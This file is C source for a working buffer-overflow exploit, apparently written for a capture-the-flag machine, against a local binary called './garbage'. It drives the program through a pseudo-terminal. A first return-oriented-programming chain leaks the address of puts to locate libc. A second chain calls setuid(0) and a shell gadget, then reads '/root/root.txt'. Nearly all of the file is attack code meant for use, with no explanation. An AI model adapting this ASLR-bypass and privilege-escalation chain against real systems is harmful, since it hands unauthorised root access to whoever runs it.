#define _BSD_SOURCE
#define _XOPEN_SOURCE  600
#include <stddef.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>

#define sys_error(s) perror(s)
#define success(...) fprintf(stderr, __VA_ARGS__)

__attribute__((packed))
struct Payload {
	char padding[136];
	size_t qw[64];
};

static void shove(int fd, void *p, int argc)
{
	size_t n = 136 + 8*argc + 1;
	((char*)p)[n-1] = '\n';
	ssize_t m = write(fd, p, n);
	success("wrote %zu/%zu bytes\n", m, n);
}

static const size_t puts_ofs = 0x000809c0; // Ellingson
static const size_t system_ofs = 0x0004f440;

static void skipln(int fd, int n)
{
	static char buf[4019];
	int i = 0;
	buf[i] = 0;
	success("skipping");
	do {
		read(fd, buf+i, 1);
		buf[i+1] = 0;
		success("read char %s...\n", buf);
		if (i+1 == n)
			break;
	}  while (buf[i++] != '\n');
}

static const size_t RELOC_PUTS = 0x00404028;
static const size_t PUTS = 0x00401050;
static const size_t POP_RDI = 0x000000000040179b;
static const size_t POP_RSI_R15 = 0x0000000000401799;
static const size_t JMP_RAX = 0x00000000004011cc;
static const size_t CALL_RAX = 0x0000000000401010;
static const size_t RELOC_EXIT = 0x004040b0;
static const size_t LOADER =  0x00401513;


static void exploit_main(int fd)
{
	sleep(1);
	struct Payload p;
	memset(p.padding, 'A', 136);
	fprintf(stderr, "offset = %zi\n", (char*)p.qw - p.padding);
	p.qw[0] = POP_RDI;
	p.qw[1] = RELOC_PUTS;
	p.qw[2] = PUTS;
	p.qw[3] = LOADER;
	skipln(fd, 23);
	shove(fd, &p, 4);
	skipln(fd, -1);
	skipln(fd, -1);
	char *puts_addr = 0;
	ssize_t m = read(fd, &puts_addr, 6);
	success("puts @ %p / %zi\n", puts_addr, m);
	char *libc = puts_addr - puts_ofs;
	success("libc @ %p\n", libc);
	success("system @ %p\n", libc+system_ofs);
	int n = 0;
	p.qw[n++] = POP_RDI;
	p.qw[n++] = 0;
	p.qw[n++] = POP_RSI_R15;
	p.qw[n++] = 0;
	p.qw[n++] = 0;
	p.qw[n++] = libc + 0x0000000000001b96;
	p.qw[n++] = 0;
	p.qw[n++] = libc + 0x000e5c90;
	p.qw[n++] = libc + 0x000000000003eb0b;
	p.qw[n++] = 0;
	p.qw[n++] = (size_t)(libc + 0x4f2c5);
	p.qw[n++] = libc + 0x00043120;
	shove(fd, &p, n);

	for (int i = 0; i <100; i++) {
		char *c = "id; cat /root/root.txt\n";
		write(fd, c, strlen(c));
	}
	for (;;) {
		char c;
		ssize_t n = read(fd, &c, 1);
		if (n <= 0) {
			success("done");
			exit(0);
		}
		putchar(c);
	}
}

#include <termios.h>

static void makeraw(int fd)
{
	struct termios options;
	tcgetattr(fd, &options);
	//cfmakeraw(&options);
	options.c_iflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);
	options.c_oflag &= ~(OPOST);
	options.c_cflag &= ~(CSIZE | PARENB);
	options.c_cflag |= CS8;
	options.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);
	tcsetattr(fd, TCSANOW, &options);
}

int main(int _argc, char **_argv, char **envp)
{
	char *argv[] = { "./garbage", 0 };
	//char *argv[] = { "./spy", 0 };
	int argc = 1;

	int master = posix_openpt(O_RDWR);
	if (master < 0) {
		sys_error("posix_openpt");
		exit(1);
	}
	grantpt(master);
	unlockpt(master);

	char *slave_path = ptsname(master);
	if (!slave_path) {
		sys_error("ptsname");
		exit(1);
	}
	success("ptsname -> %s\n", slave_path);

	int slave = open(slave_path, O_RDWR);
	if (slave < 0) {
		sys_error(slave_path);
		exit(-1);
	}
	makeraw(slave);
	makeraw(master);

	pid_t pid = fork();
	if (pid < 0) {
		sys_error("fork");
		exit(1);
	}
	if (pid != 0) {
		close(slave);
		exploit_main(master);
	} else {
		close(master);
		success("execve %s\n", argv[0]);
		dup2(slave, STDIN_FILENO);
		dup2(slave, STDOUT_FILENO);
		close(slave);
		execve(argv[0], argv, envp);
		sys_error("execve failed");
		exit(-1);
	}
	return 0;
}
